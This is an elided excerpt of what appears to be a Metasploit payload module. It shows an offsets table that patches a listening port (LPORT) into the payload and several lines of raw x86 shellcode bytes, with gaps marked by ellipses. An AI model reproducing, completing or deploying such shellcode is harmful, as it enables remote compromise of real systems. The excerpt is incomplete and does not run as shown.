					...
					'Offsets' =>
						{
							...
							# 'EXITFUNC' => [ 290, 'V' ],
							'LPORT'    => [ 547, 'v' ], # Not a typo, really little endian
						},
					'Payload' =>
...
"\xEB\x16\x6A\x40\x68\x00\x10\x00\x00\x68\x00\x10\x00\x00\x6A\x00" +
...
"\x8B\x10\x8B\x52\x38\xFF\xD2\xBF\x00\x81\x7E\x5E\x58\x5A\x59\x51" +
"\x52\x50\x6A\x00\x51\x6A\x01\x8B\x12\x52\x8B\x12\x8B\x52\x0C\xFF" +
"\xD2\x8B\x44\x24\x08\x8B\x00\xBA\x00\x00\x00\x00\x39\xC2\x0F\x84" +
"\xB1\x00\x00\x00\x39\xC7\x75\xD4\x58\x5A\x59\x5F\x57\x51\x52\x50" +
